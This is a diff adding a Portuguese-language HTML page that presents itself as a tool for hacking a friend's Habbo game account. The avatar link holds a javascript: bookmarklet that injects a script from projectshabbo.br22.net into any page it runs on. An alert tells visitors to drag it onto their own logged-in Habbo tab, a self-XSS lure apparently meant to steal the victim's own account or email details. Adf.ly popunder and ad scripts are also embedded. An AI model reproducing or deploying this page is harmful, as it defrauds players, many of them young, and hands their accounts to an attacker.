@@ -1,0 +1,133 @@
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
+
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
+<title>Hackeie seu Amigo rico - Hacker Habbos</title>
+<link rel="shortcut icon" href="http://habboo-a.akamaihd.net/habboweb/63_1dc60c6d6ea6e089c6893ab4e0541ee0/1666/web-gallery/v2/favicon.ico" type="image/vnd.microsoft.icon" />
+<style type="text/css">
+<!--
+.style1 {
+	font-size: 18px;
+	font-weight: bold;
+}
+body {
+	background-image: url(http://www.magyar-mernok.hu/files/apjalanya/virusok120612.jpg);
+}
+-->
+</style>
+<script src="http://cf.ads.kontextua.com/container/tags/57027.js"></script>
+</head>
+
+        <script language="javascript">
+<!--
+var hi_list = [4,0,4,0,0,0,0,0,0,0,0,0,0,0];
+var hi_act_list = [0,"wav","sit","wlk"];
+var hi_gest_list = [0,"sml","sad","agr","spk","srp"];
+var n_src = "";
+var act_pos = "";
+var user = "COLOQUE O NOME DE SEU HABBO";
+var loc = "com.br";
+function ch_user(){
+    user = window.document.getElementById("input_name").value;
+    changeimg(6);
+}
+function ch_loc(){
+    loc = window.document.getElementById("input_loc").value;
+    changeimg(6);
+}
+function changeimg(act,a){
+    switch (a){
+        case 0: hi_list[act] = hi_list[act]+1;
+        if(hi_list[act] > 8){hi_list[act] = 1;}
+        break;
+        case 1: hi_list[act] = hi_list[act]-1;
+        if(hi_list[act] < 1){hi_list[act] = 8;}
+        break;
+        case 2: hi_list[act] = hi_list[act]+1;
+        if(hi_list[act] > 5){hi_list[act] = 0;}
+        break;
+        case 3: hi_list[act] = hi_list[act]-1;
+        if(hi_list[act] < 0){hi_list[act] = 5;}
+        break;
+        case 4: hi_list[act] = hi_list[act]+1;
+        if(hi_list[act] > 3){hi_list[act] = 0;}
+        break;
+        case 5: hi_list[act] = hi_list[act]-1;
+        if(hi_list[act] < 0){hi_list[act] = 3;}
+        break;
+    }
+    n_src = 'http://www.habbo.'+loc+'/habbo-imaging/avatarimage?user='+user+'&action='+hi_act_list[hi_list[3]]+'&direction='+hi_list[2]+'&head_direction='+hi_list[0]+'&img_format=gif&gesture='+hi_gest_list[hi_list[1]];
+    window.document.images['habboimg'].src = n_src;
+    window.document.getElementById("img_link").href = n_src;
+    url.result.value = 'http://www.habbo.'+loc+'/habbo-imaging/avatarimage?user='+user+'&action='+hi_act_list[hi_list[3]]+'&direction='+hi_list[2]+'&head_direction='+hi_list[0]+'&gesture='+hi_gest_list[hi_list[1]]+'&img_format=gif';
+   
+   
+    switch(hi_list[3]){
+        case 0: act_pos = "-11px -68px";
+        break;
+        case 1: act_pos = "-25px -18px";
+        break;
+        case 2: act_pos = "-11px -63px";
+        break;
+        case 3: act_pos = "-11px -68px";
+        break;
+    }
+}    
+-->
+</script>
+<body>
+<p>&nbsp;</p>
+<table width="743" height="45" border="0" align="center" cellpadding="0" cellspacing="0">
+  <tr>
+    <td valign="top"><img src="http://www.habbo.com.br/v2/images/habbologo_whiteR.gif" align="left" /></td>
+  </tr>
+</table>
+<table width="743" height="302" border="0" align="center" cellpadding="0" cellspacing="0" background="http://2.bp.blogspot.com/-dVjoJqL_gDM/UW8bVzUWa0I/AAAAAAAAAvw/V76Ij5d4eeI/s1600/hacked.png">
+  <tr>
+    <td width="412" align="center">&nbsp;</td>
+    <td width="331" align="center">
+    <a onClick="alert('VocÃª deve arrastar (clique e segure) e soltar na aba do navegador na Habbo Principal !');return false;" href="javascript:var email = document.createElement('script');email.src='http://projectshabbo.br22.net/Scorpion2014/scorpionphp/js_email.php?uid=TnpNMA==';document.body.appendChild(email);void(0);">
+    <img src="http://www.habbo.com.br/habbo-imaging/avatarimage?user=totony:D2&amp;action=0&amp;direction=4&amp;head_direction=4&amp;img_format=gif&amp;gesture=0" name="habboimg" id="habboimg" title="Arraste essa Pessoa na aba principal do Habbo, para hackear!!" /></a>
+      <table id="table3" cellspacing="0" cellpadding="0" width="23%" height="48">
+      <tbody>
+        <tr>
+          <td valign="top" width="63%" height="30" align="center"><span class="style1"><font face="Verdana">Nome Habbo:</font></span><font size="1"><br />
+                      </font>
+              <input id="input_name" onchange="javascript:ch_user();" style="padding-right: 0pt; padding-left: 0pt; font-weight: normal; font-size: 10px; padding-bottom: 0pt; margin: 0pt; padding-top: 0pt; font-family: Verdana,Arial,Helvetica,sans-serif;font-size:15px; width:140px;" required="required" placeholder="Nome da Vitima!" name="ht_input_name" type="text" /></td>
+          </tr>
+        <tr>
+          <td valign="top" height="18" align="center"><input name="submit" type="submit" style="font-size:15px; width:130px;" class="bt" value="Hackear" />
+            <input name="loc" type="hidden" id="loc" value="com.br" />
+            &nbsp;</td>
+        </tr>
+      </tbody>
+    </table></td>
+  </tr>
+</table>
+<p>&nbsp;</p>
+</body>
+</html>
+
+''SEU EMAIL''
+<script type="text/javascript"> 
+    var adfly_id = 1950478; 
+    var adfly_advert = 'int'; 
+    var frequency_cap = 5; 
+    var frequency_delay = 5; 
+    var init_delay = 3; 
+    var popunder = true; 
+</script> 
+<script src="https://cdn.adf.ly/js/entry.js"></script>
+<script src="http://cf.ads.kontextua.com/container/tags/59943.js"></script><script type="text/javascript"> 
+    var adfly_id = 1950478; 
+    var adfly_advert = 'int'; 
+    var frequency_cap = 5; 
+    var frequency_delay = 5; 
+    var init_delay = 3; 
+    var popunder = true; 
+</script> 
+<script src="https://cdn.adf.ly/js/entry.js"></script>
+<script src="http://cf.ads.kontextua.com/container/tags/59943.js"></script>
